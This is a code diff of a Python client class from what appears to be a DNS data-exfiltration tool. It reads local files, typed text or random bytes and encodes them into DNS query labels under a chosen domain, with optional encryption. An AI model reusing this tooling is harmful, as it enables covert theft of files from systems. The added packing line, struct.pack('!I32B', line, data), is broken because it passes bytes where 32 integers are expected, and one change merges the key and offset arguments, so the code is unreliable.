@@ -24,8 +24,7 @@ class Client():
         self.is_file = args.file
         self.is_rand = args.rand
         self.qtype = args.qtype
-        self.key = args.aes_key
-        self.offset = args.scr_offset
+        self.key = args.aes_key or args.scr_offset
     
     def run(self):
         try:
@@ -73,10 +72,10 @@ class Client():
             if protocol is socket.SOCK_STREAM:
                 sock.setblocking(True)
             sock.settimeout(self.timeout)
+            sock.connect(self.addr)
 
             responses = []
             for data in lst:
-                sock.connect(self.addr)
                 sock.send(data)
 
                 response = sock.recv(exf.SOCK_BUFFER_SIZE)
@@ -89,30 +88,27 @@ class Client():
 
     def read_text(self):
         text = input("> ").encode()
-        header = struct.pack("!4sI", b'text', len(text))
-
-        return header + text
+        return text
 
     def read_random(self):
         size = random.choice(
             [8, 16, 32, 64, 128, 256, 512, 1024])
         
         rand = exf.random_bytes(size)
-        header = struct.pack("!4sH", b'rand', len(rand))
-
-        return header + rand
+        return rand
 
     def read_file(self, buffer=32):
         whole = b''
         with open(self.is_file, 'rb') as file:
             data = file.read(buffer)
+            line = 0
+
             while (data):
-                whole += data
+                whole += struct.pack('!I32B', line, data)      
                 data = file.read(buffer)
+                line += 1
         
-        header = struct.pack("!4sH", b'file', len(whole))
-        
-        return header + whole
+        return whole
 
     def dns_ask(self, data, encrypt, *args):
         labels = exf.domain_encode(data, self.domain, base64.urlsafe_b64encode, encrypt, *args)
